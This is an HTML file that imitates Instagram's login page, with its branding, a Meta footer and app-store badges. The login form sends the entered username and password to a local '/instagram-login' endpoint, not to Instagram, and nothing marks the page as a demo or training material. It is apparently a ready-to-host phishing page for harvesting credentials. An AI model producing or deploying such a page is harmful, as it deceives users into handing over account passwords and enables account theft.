<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Log in</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect x='4' y='4' width='40' height='40' rx='10' fill='url(%23g)'/><defs><linearGradient id='g' x1='0' y1='0' x2='48' y2='48'><stop stop-color='%23f09433'/><stop offset='25%25' stop-color='%23e6683c'/><stop offset='50%25' stop-color='%23dc2743'/><stop offset='75%25' stop-color='%23cc2366'/><stop offset='100%25' stop-color='%23bc1888'/></linearGradient></defs></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .main-container {
            display: flex;
            align-items: center;
            gap: 32px;
            margin-bottom: 20px;
        }
        .phone-frame {
            display: none;
        }
        @media (min-width: 876px) {
            .phone-frame { display: block; position: relative; }
        }
        .phone-frame img {
            height: 580px;
        }
        .phone-screen {
            position: absolute;
            top: 28px;
            left: 43px;
            width: 248px;
            height: 536px;
            border-radius: 2px;
            overflow: hidden;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
        }
        .insta-logo {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 24px;
            letter-spacing: -1px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .login-card form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .login-card input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }
        .login-card input:focus {
            border-color: #a8a8a8;
            background: #fff;
        }
        .login-card input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        .login-btn {
            width: 100%;
            padding: 8px 0;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            opacity: 0.9;
        }
        .login-btn:hover {
            opacity: 1;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider span {
            padding: 0 18px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin: 8px 0 12px;
            cursor: pointer;
        }
        .fb-login svg {
            width: 16px;
            height: 16px;
        }
        .forgot-password {
            display: block;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 22px 40px;
            width: 350px;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #262626;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .get-app {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #262626;
        }
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }
        .app-badges img {
            height: 40px;
        }
        .app-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            background: #000;
            color: #fff;
            padding: 4px 12px;
            border-radius: 6px;
            font-size: 10px;
            text-decoration: none;
        }
        .app-badge svg {
            width: 18px;
            height: 18px;
            fill: white;
        }
        .app-badge .badge-text small {
            display: block;
            font-size: 7px;
            opacity: 0.7;
        }
        .app-badge .badge-text strong {
            font-size: 11px;
        }
        .footer-links {
            max-width: 800px;
            margin-top: 24px;
            text-align: center;
            padding: 0 16px;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            font-size: 12px;
            margin: 0 8px 8px;
            display: inline-block;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .copyright {
            color: #737373;
            font-size: 12px;
            margin-top: 12px;
        }
        @media (max-width: 875px) {
            .main-container { flex-direction: column; gap: 0; }
            .login-card { margin-top: 40px; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Phone Frame (Desktop only) -->
        <div class="phone-frame">
            <svg width="340" height="590" viewBox="0 0 340 590" xmlns="http://www.w3.org/2000/svg">
                <rect x="10" y="10" width="320" height="570" rx="30" fill="none" stroke="#dbdbdb" stroke-width="4"/>
                <rect x="25" y="25" width="290" height="540" rx="2" fill="#fff"/>
                <rect x="25" y="25" width="290" height="540" rx="2" fill="url(#phonebg)"/>
                <defs>
                    <linearGradient id="phonebg" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stop-color="#fafafa"/>
                        <stop offset="100%" stop-color="#f0f0f0"/>
                    </linearGradient>
                </defs>
                <!-- Mock phone content -->
                <text x="170" y="260" text-anchor="middle" font-family="sans-serif" font-size="16" fill="#262626" font-weight="600">Instagram</text>
                <text x="170" y="290" text-anchor="middle" font-family="sans-serif" font-size="12" fill="#8e8e8e">Phone and app screenshots</text>
                <text x="170" y="310" text-anchor="middle" font-family="sans-serif" font-size="12" fill="#8e8e8e">appear here</text>
                <rect x="60" y="340" width="220" height="30" rx="3" fill="#fafafa" stroke="#dbdbdb" stroke-width="1"/>
                <rect x="60" y="375" width="220" height="30" rx="3" fill="#fafafa" stroke="#dbdbdb" stroke-width="1"/>
                <rect x="60" y="415" width="220" height="30" rx="8" fill="#0095f6"/>
            </svg>
        </div>

        <!-- Login Form -->
        <div>
            <div class="login-card">
                <div class="insta-logo">Instagram</div>

                <form action="/instagram-login" method="POST">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log in</button>
                </form>

            </div>

            <div class="get-app">Get the app.</div>
            <div class="app-badges">
                <a href="#" class="app-badge">
                    <svg viewBox="0 0 24 24"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.08zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
                    <span class="badge-text">
                        <small>Download on the</small>
                        <strong>App Store</strong>
                    </span>
                </a>
                <a href="#" class="app-badge">
                    <svg viewBox="0 0 24 24"><path d="M3.65 2.15L14.5 12 3.65 21.85c-.18.18-.45.21-.65.05-.1-.08-.15-.2-.15-.35V2.5c0-.15.05-.27.15-.35.2-.16.47-.13.65.05zm14.5 8.9l-4.05 3.95L5.15 3.35l12.85 7.7c.35.2.5.6.4.95-.05.15-.15.25-.25.35z"/></svg>
                    <span class="badge-text">
                        <small>GET IT ON</small>
                        <strong>Google Play</strong>
                    </span>
                </a>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer-links">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading &amp; Non-Users</a>
        <a href="#">Meta Verified</a>
        <div class="copyright">© 2026 Instagram from Meta</div>
    </div>
</body>
</html>
